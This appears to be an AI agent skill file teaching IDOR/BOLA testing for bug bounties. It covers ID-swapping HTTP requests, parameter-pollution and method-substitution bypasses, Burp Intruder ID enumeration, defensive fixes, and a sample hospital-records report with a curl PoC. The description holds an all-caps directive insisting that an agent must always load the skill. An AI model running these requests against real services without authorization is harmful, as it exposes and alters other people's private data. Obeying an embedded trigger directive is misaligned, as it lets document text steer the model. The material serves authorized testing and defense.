---
name: insecure-direct-object-reference-idor
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit Insecure Direct Object Reference (IDOR), or Broken Object Level 
  Authorization (BOLA), vulnerabilities. Manipulate internal identifiers (e.g., user IDs, 
  database primary keys, transaction IDs) within HTTP request parameters or API payloads to 
  unauthorizedly access, modify, or delete data belonging to other users.
domain: cybersecurity
subdomain: bug-hunting
category: Business Logic
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1212]
platforms: [linux, windows, cloud]
tags: [idor, bola, broken-access-control, api-security, horizontal-privilege-escalation, burp-suite, bug-bounty]
tools: [burp-suite, autorize, postman]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Insecure Direct Object Reference (IDOR) / BOLA

## When to Use
- When conducting rigorous Web Application or API penetration testing targeting heavily utilized, multi-tenant applications (e.g., SaaS platforms, banking portals, healthcare record systems).
- Upon discovering numerical, sequential, or predictable object identifiers (e.g., `user_id=1254`, `receipt_id=9881`) explicitly passed within the URL path, query string, or JSON POST body.
- To demonstrate severe horizontal privilege escalation, proving that User A can critically manipulate the sensitive financial or private healthcare data of User B.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Target Surface (The Identifier)

```http
# Concept: IDOR occurs fundamentally when an application takes user-supplied input to 
# directly retrieve a database object, but disastrously fails to verify if the requesting 
# user actually owns or has authorization to access that specific object.

# 1. Capture typical traffic utilizing Burp Suite explicitly tracking where identifiers exist.

# Example A: The URL Parameter
GET /api/v1/user/profile?user_id=45091 HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>

# Example B: The JSON POST Body (Hidden logic)
POST /api/v1/payments/refund HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>
{
    "transaction_id": 88412,
    "amount": 50.00
}

# Example C: RESTful URI Pathing
DELETE /api/v1/documents/invoice_339.pdf HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>
```

### Phase 2: Vulnerability Validation (The Attack)

```http
# Concept: Attempting Horizontal Privilege Escalation. We manipulate the identifier 
# belonging to our own account to target an identifier we do not own, utilizing our standard 
# low-privileged token.

# 1. Create two distinct accounts on the platform:
# Account A (Attacker): user_id = 45091
# Account B (Victim): user_id = 45092 (Ensure you control Account B to verify the impact legally!)

# 2. Replay the HTTP request utilizing Account A's Session Token, but request Account B's ID.
GET /api/v1/user/profile?user_id=45092 HTTP/1.1
Authorization: Bearer <USER_A_TOKEN>

# 3. Analyze the Server's HTTP Response:
# Result A (Secure): HTTP 403 Forbidden or 401 Unauthorized. (The server checked authorization).
# Result B (Secure): HTTP 404 Not Found. (The server obfuscated the target effectively).
# Result C (VULNERABLE - IDOR): HTTP 200 OK
{
    "username": "victimUser22",
    "email": "victim_b@corporate.com",
    "ssn": "xxx-xx-1234",
    "credit_card": "4111-xxxx-xxxx-4444"
}
```

### Phase 3: Advanced IDOR Mechanics (Bypasses)

```http
# Concept: Developers occasionally attempt to insecurely patch IDOR. Circumvent naive filters.

# 1. Parameter Pollution (HPP):
# Supply the parameter twice. The WAF explicitly checks the first parameter (`user_id=45091`), 
# but the backend database implicitly executes querying the second parameter (`user_id=45092`).
GET /api/v1/profile?user_id=45091&user_id=45092

# 2. Array/JSON Injection:
# Transform an expected integer into a multi-value array within JSON.
{"user_id": [45091, 45092]}

# 3. Method Substitution (RESTful failures):
# A developer perfectly secured `GET /api/users/22` (Read access restricted), but carelessly 
# neglected to secure the modification endpoint.
POST /api/users/22/change_password 
{"new_password": "Hacked123!"}

# 4. Insecure GUID/UUID Predictability:
# If identifiers are universally unique IDs (UUIDs) like `123e4567-e89b-12d3...`, 
# brutal IDOR guessing is impossible. However, if the UUID is inadvertently leaked globally 
# within public forums, other API responses, or javascript variables, capture it and replay 
# it directly into the vulnerable endpoint parameter.
```

### Phase 4: Automation (Autorize / Burp Intruder)

```text
# Concept: Manually testing thousands of distinct IDs is tedious. Automate horizontally.

# 1. Burp Suite Intruder (Brute Forcing Sequential IDs):
# Send the `GET /api/documents/invoice_§331§` to Intruder.
# Payload: Numbers sequentially (300 to 400).
# Analyze the output explicitly searching for `HTTP 200 OK` exposing other organizations' invoices.

# 2. Autorize (Burp Extension):
# Provide Autorize the pristine authentication token for a highly privileged Admin user. 
# Browse the application utilizing a totally unauthenticated browser. 
# Autorize automatically replays every unauthenticated request inserting the Admin token, visually 
# charting precisely which endpoints insecurely leak data or execute actions bypassing role checks globally.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Capture Application HTTP Traffic] --> B[Identify Object Reference Parameters (IDs, Filenames)]
    B --> C[Create Test Account A and Validate Account B]
    C --> D[Modify Parameter ID referencing Object A to Object B]
    D --> E[Replay modifying Request with Account A token]
    E --> F{HTTP Response Result?}
    F -->|401/403/404| G[Endpoint secure. No IDOR vulnerability.]
    F -->|200 OK (Returning User B Data)| H[IDOR Discovered! Horizontal Privilege Escalation Confirmed.]
    H --> I[Increase Severity: Discover if DELETE or POST methods also accept the vulnerable ID blindly]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Implement Robust Access Control Matrices**: IDOR cannot exist if authorization is intrinsically enforced mathematically on the backend architecture. Every single request fetching an object from the database MUST execute a conditional query: `SELECT * FROM invoices WHERE invoice_id = [Requested_ID] AND owner_user_id = [Current_Session_User_ID]`. If the session ID does not match the database owner ID explicitly, return empty securely.
- **Utilize Cryptographically Secure UUIDs**: Deprecate utilizing predictable, auto-incrementing integers (e.g., `user_id=1, 2, 3`) universally across all API development. Migrate entirely to UUIDv4 strings (e.g., `f47ac10b-58cc-4372-a567-0e02b2c3d479`). While UUIDs do not "fix" the lack of authorization directly, they fundamentally render blind horizontal iteration mathematically impossible for an attacker to guess, vastly reducing massive automated data exposure.
- **Indirect Object References**: Instead of utilizing actual database primary keys in public HTTP parameters, deploy cryptographic mapping dictionaries (Indirect References) stored exclusively within the user's active session state. Map `File A` to `Value 1`, `File C` to `Value 2`. The attacker requesting `Value 3` fails identically because the mapping exists uniquely tied to the authenticated session context.

## Key Concepts
| Concept | Description |
|---------|-------------|
| IDOR (Insecure Direct Object Reference) | A pervasive vulnerability classified under OWASP Broken Access Control. It occurs when an application provides direct access to objects utilizing developer-created identifiers explicitly without performing robust parameter-level authorization checks |
| BOLA (Broken Object Level Authorization) | The identical vulnerability natively terminology mapped under the OWASP API Security Top 10 (API1:2023) emphasizing its severe prevalence uniquely within REST/GraphQL stateless architectures |
| Horizontal Privilege Escalation | Expanding access to resources, files, or capabilities natively belonging to a separate user possessing the exact identical permission or role level (e.g., User A hacking User B) |
| UUID (Universally Unique Identifier) | A 128-bit algorithmic string practically guaranteeing uniqueness universally. Utilizing UUIDv4 essentially eliminates purely sequential parameter-guessing attacks |

## Output Format
```
Bug Bounty Submission: Critical IDOR in Healthcare Patient Records API
======================================================================
Vulnerability: Broken Object Level Authorization (BOLA)
Severity: Critical (CVSS 9.1) - Massive PII Exposure
Endpoint: `GET https://patient-portal.hospital.com/api/v2/records/{patient_id}/diagnostics`

Description:
A severe Broken Object Level Authorization vulnerability was discovered within the portal's primary diagnostic retrieval API architecture. 

When a standard, low-privileged patient successfully authenticates, the system assigns a JWT session token to authenticate requests. However, the application insecurely accepts the `{patient_id}` explicitly within the RESTful URL path, fundamentally utilizing this unvalidated integer to query the backend database directly.

An attacker simply capturing their legitimate request, for example: `GET /api/v2/records/55104/diagnostics`, and maliciously modifying the numeric identifier to `55105`, successfully circumvents all Access Control methodologies. 

The server replies unequivocally with a `200 OK` JSON document detailing highly confidential clinical test results, X-Ray links, and physician notes belonging exclusively to a completely disparate, unauthorized patient.

Reproduction Steps:
```bash
curl -i -s -k -X 'GET' \
    -H 'Authorization: Bearer my_attacker_jwt_token' \
    'https://patient-portal.hospital.com/api/v2/records/55105/diagnostics'
```

Impact:
Because the {patient_id} integers are sequential (Auto-incrementing Database Keys), an automated attacker leveraging Burp Suite Intruder could sequentially iterate from ID `1` to `99999` downloading the comprehensive Private Healthcare Information (PHI) of the entire hospital registry in under an hour, resulting in a devastating compliance catastrophe.
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (IDOR)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Facebook/Instagram** | $30,000 | (Undisclosed) | IDOR via GraphQL — brute-force media IDs exposed private posts/stories/reels | 2023 |
| **GitHub (SAML)** | $15,000 | (Undisclosed) | SAML authentication bug allowing cross-tenant access | 2023 |
| **Shopify** | $5,000 | (Undisclosed) | IDOR in GraphQL API — predictable billing invoice IDs → download any user's invoice PDFs | 2024 |
| **Facebook** | $4,500 | Roy Castillo | IDOR exposing user primary email addresses | 2023 |
| **GitLab ML Registry** | $1,160 | (Undisclosed) | IDOR via incremental model IDs (`gid://gitlab/Ml::Model/1000401`) → access ALL private ML models | 2024 |

**Key Lesson**: Facebook paid $30K because the IDOR exposed private Instagram content at scale—
every user's private posts/stories/reels were accessible. Shopify's $5K IDOR was in GraphQL 
billing APIs with sequential IDs. GitLab's ML model IDOR shows that new features (AI/ML) often 
ship with weaker access controls.

**The $30K formula:**
1. Find resource with sequential/predictable ID
2. Confirm cross-user access (your token, their resource)
3. Prove scale: "This affects ALL 2B Instagram users' private content"
4. Quantify: "GDPR Art. 83(5) exposure: up to €20M or 4% global turnover"

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- OWASP API Security Top 10: [API1:2023 - Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- PortSwigger: [Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)
- HackerOne: [IDOR Bug Bounty Reports](https://hackerone.com/hacktivity?querystring=idor)
